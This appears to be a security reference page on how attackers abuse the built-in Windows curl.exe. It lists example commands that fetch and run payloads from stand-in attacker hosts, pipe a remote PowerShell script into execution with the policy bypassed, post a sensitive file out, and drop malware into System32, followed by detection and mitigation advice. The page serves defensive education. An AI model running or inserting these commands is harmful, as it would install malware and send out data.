# curl.exe
## What is it?
*```curl.exe``` is a **built-in Windows command-line tool** used for **transferring data over various protocols** (HTTP, HTTPS, FTP, SMB, etc.).*  
*It allows users to **download and upload files, interact with APIs, and automate network requests** directly from the command line.*  

*Because it is a **trusted Microsoft binary**, attackers often **abuse it for downloading malware, data exfiltration, and C2 communications**, bypassing security tools.*

## Legitimate Usage
- **Download & Upload Files** → Fetch remote content or send data to a server.
- **Interact with APIs** → Send HTTP requests for automation and scripting.
- **Test Network Connectivity** → Check response headers, resolve DNS, and debug requests.
- **Automate Web Requests** → Automate interactions with web services.

## How to abuse it
- **Download Malware & Payloads** → Fetch malicious files from external servers.
- **Exfiltrate Data** → Send stolen data to an attacker's server.
- **C2 Communication** → Act as a simple backdoor for executing commands.
- **Bypass Security Controls** → Uses a **trusted binary** (LOLBas) to evade detection.
- **Proxy & Tunneling** → Relay traffic to bypass network restrictions.

## Example Attacks
### 1. Download & Execute Malware
*Attackers use ```curl.exe``` to retrieve malicious payloads and execute them.*

```
curl -o payload.exe http://malicious.com/payload.exe && payload.exe
```

**Effect:**
- Downloads ```payload.exe``` from ```http://malicious.com```.
- Executes the payload **without triggering security alerts**.

### 2. Download & Execute PowerShell Payload
*Fetches a PowerShell script from an attacker’s server and executes it in memory.*

```
curl -s http://attacker.com/script.ps1 | powershell -nop -exec bypass
```

**Effect:**
- Runs a **fileless attack**, making it harder to detect.
- Avoids writing scripts to disk, reducing forensic evidence.

### 3. Data Exfiltration via HTTP
*Attackers send stolen data to an attacker-controlled server.*

```
curl -X POST -d @C:\SensitiveData.txt http://attacker.com/upload
```

**Effect:**
- Uploads ```SensitiveData.txt``` to an external server.
- **Bypasses network monitoring tools** using trusted traffic.

### 4. Reverse Shell over HTTP
*Establishes a connection to an attacker’s C2 server to execute commands remotely.*

```
curl http://attacker.com/cmd?cmd=whoami
```

**Effect:**
- Executes **remote commands** on the infected system.
- Mimics **legitimate web traffic**, making detection difficult.

### 5. Bypassing Security Policies (Downloading to Trusted Directories)
*Some security policies block execution from user directories but allow downloads to trusted locations.*

```
curl -o C:\Windows\System32\trusted.exe http://malicious.com/malware.exe
```

**Effect:**
- Places **malware in a whitelisted directory**, bypassing restrictions.

### 6. Proxy & Tunneling for Evasion
*Attackers use curl.exe to bypass network restrictions by routing traffic through proxies.*

```
curl -x http://proxyserver:8080 -o malware.exe http://malicious.com/payload.exe
```

**Effect:**
- Hides the attack **behind a proxy**, making attribution harder.
- Allows malware **to bypass firewalls and network filters**.

## Detection & Mitigation
### Detection Methods
**Monitor Outbound Requests**
- **Event ID 4688 (Process Creation)** → Look for suspicious ```curl.exe``` executions.
- **Monitor connections to untrusted domains/IPs.**

**Check for File Downloads**
- **Event ID 4104 (PowerShell Script Execution)** → Detect command-line execution of remote scripts.
- **Look for file writes in suspicious locations (e.g., Temp, AppData).**

**Detect Data Exfiltration**
- **Unusual outbound HTTP POST requests** to unknown domains.
- **Check for repeated requests sending large amounts of data.**

### Mitigation Strategies
- **Restrict Internet Access for curl.exe** → Block outbound traffic if not required.
- **Use Application Control (AppLocker, WDAC)** → Prevent execution in untrusted locations.
- **Monitor HTTP Requests** → Inspect requests for anomalies.
- **Limit Access to System Directories** → Prevent dropping executables in trusted folders.
